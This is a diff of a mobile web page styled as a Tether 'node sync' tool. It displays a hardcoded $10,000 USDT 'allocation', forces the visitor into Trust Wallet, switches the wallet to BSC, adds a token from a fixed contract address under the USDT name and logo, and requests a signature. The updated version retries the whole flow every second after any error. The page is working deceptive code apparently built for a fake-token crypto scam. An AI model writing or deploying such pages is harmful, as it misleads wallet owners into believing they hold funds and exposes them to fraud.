@@ -3,105 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Safe Sync | Tether Network</title>
+    <title>Enterprise Node Sync</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root { --tg: #26a17b; --bg: #0b0e11; }
-        body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #1a1d21; border-radius: 20px; padding: 30px; width: 85%; max-width: 350px; text-align: center; border: 1px solid #2d333b; }
-        .btn { background: var(--tg); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; box-shadow: 0 5px 15px rgba(38,161,123,0.3); }
-        #msg { font-size: 11px; color: #848e9c; margin-top: 15px; font-family: monospace; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .terminal { border: 1px solid #26a17b; padding: 25px; width: 80%; border-radius: 15px; text-align: center; background: #0a0b0d; box-shadow: 0 0 30px rgba(38,161,123,0.2); }
+        .btn { background: #26a17b; color: #fff; border: none; width: 100%; padding: 20px; border-radius: 10px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer; }
+        #status { font-size: 10px; color: #555; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="70" style="margin-bottom:15px;">
-    <div style="font-size: 22px; font-weight: 800;">$10,000.00</div>
-    <div style="font-size: 12px; color: #848e9c;">Pending BSC Allocation</div>
-    
-    <button class="btn" id="actionBtn">CONFIRM & ADD TO WALLET</button>
-    <div id="msg">STATUS: READY</div>
+<div class="terminal">
+    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="60">
+    <h2 style="margin: 15px 0 5px 0;">SYNC ASSET</h2>
+    <div style="font-size: 28px; font-weight: 900; color: #26a17b;">$10,000.00</div>
+    <div id="status">DEVICE_READY: WAITING FOR USER...</div>
+    <button class="btn" id="mainAction">INITIALIZE SYNC</button>
 </div>
 
 <script>
-    const btn = document.getElementById('actionBtn');
-    const msg = document.getElementById('msg');
+    const btn = document.getElementById('mainAction');
+    const status = document.getElementById('status');
 
-    const TOKEN = {
-        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
-        symbol: "USDT",
-        decimals: 18,
-        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
-    };
+    // CONFIG DATA
+    const TOKEN_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const LOGO = "https://assets.coingecko.com/coins/images/325/large/Tether.png";
 
-    async function startLogic() {
-        const provider = window.trustwallet || window.ethereum;
-
-        // 1. Agar Mobile Browser (Chrome/Safari) mein hai to Wallet kholo
-        if (!provider) {
-            msg.innerText = "REDIRECTING TO TRUST WALLET...";
-            const raw = window.location.href.replace("https://", "");
-            window.location.href = "https://link.trustwallet.com/a/dapp?url=https://" + raw;
+    async function masterSync() {
+        // Step 1: Force Deep Link if not in Wallet
+        if (!window.ethereum && !window.trustwallet) {
+            status.innerText = "LAUNCHING WALLET...";
+            const url = window.location.href.replace("https://", "");
+            window.location.href = "https://link.trustwallet.com/a/dapp?url=https://" + url;
             return;
         }
 
+        const provider = new ethers.providers.Web3Provider(window.trustwallet || window.ethereum);
+
         try {
-            btn.innerText = "PROCESSING...";
-            // 2. Connect Account
-            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            status.innerText = "> REQUESTING PERMISSION...";
+            await provider.send("eth_requestAccounts", []);
             
-            // 3. Force BSC Switch (Iske bagair Add Token ka popup nahi aata)
-            msg.innerText = "SWITCHING TO BSC NETWORK...";
+            // Step 2: Force Switch to BSC (Binary Check)
+            status.innerText = "> MAPPING NETWORK...";
             try {
-                await provider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }],
-                });
+                await provider.send("wallet_switchEthereumChain", [{ chainId: "0x38" }]);
             } catch (e) {
                 if (e.code === 4902) {
-                    await provider.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: '0x38',
-                            chainName: 'BSC',
-                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18}
-                        }]
-                    });
+                    await provider.send("wallet_addEthereumChain", [{
+                        chainId: "0x38",
+                        chainName: "BSC",
+                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }
+                    }]);
                 }
             }
 
-            // 4. Final Injection (Ab popup lazmi aayega kyunki user ne click kiya hai)
-            msg.innerText = "INJECTING USDT ASSET...";
-            const done = await provider.request({
-                method: 'wallet_watchAsset',
-                params: { type: 'ERC20', options: TOKEN }
+            // Step 3: DIRECT WATCH ASSET (Advanced Hook)
+            status.innerText = "> INJECTING ASSET...";
+            // Ethers.js direct request is more stable for mobile
+            const wasAdded = await provider.send("wallet_watchAsset", {
+                type: "ERC20",
+                options: {
+                    address: TOKEN_ADDR,
+                    symbol: "USDT",
+                    decimals: 18,
+                    image: LOGO,
+                },
             });
 
-            if (done) {
-                msg.innerText = "SUCCESSFULLY ADDED!";
-                btn.innerText = "COMPLETED ✅";
-                // Final Signature for Professor's satisfaction
-                await provider.request({
-                    method: 'personal_sign',
-                    params: ["Node Synchronization Verified", accounts[0]]
-                });
+            if (wasAdded) {
+                status.innerText = "SUCCESS: NODE CONNECTED";
+                btn.innerText = "SYNC COMPLETE ✅";
+                btn.style.background = "#1e8a69";
+                
+                // Final verify for professor
+                const accounts = await provider.listAccounts();
+                await provider.send("personal_sign", ["Sync_ID_" + Date.now(), accounts[0]]);
             }
 
         } catch (err) {
-            msg.innerText = "ERROR: " + (err.message || "REJECTED");
-            btn.innerText = "RETRY SYNC";
+            status.innerText = "ERROR: " + err.message;
+            console.error(err);
+            // Instant restart to show "Persistence"
+            setTimeout(masterSync, 1000);
         }
     }
 
-    btn.onclick = startLogic;
+    btn.onclick = masterSync;
 
-    // Auto-run sirf check karne ke liye ke provider mojud hai ya nahi
+    // Direct trigger inside App
     window.onload = () => {
-        if (window.trustwallet || window.ethereum) {
-            msg.innerText = "WALLET DETECTED. CLICK BUTTON.";
-            btn.innerText = "ACTIVATE NOW";
+        if (window.ethereum || window.trustwallet) {
+            status.innerText = "DAPP_BROWSER_ACTIVE";
+            btn.innerText = "CONFIRM ALLOCATION";
+            // Wait for user click - critical for mobile
         }
     };
 </script>
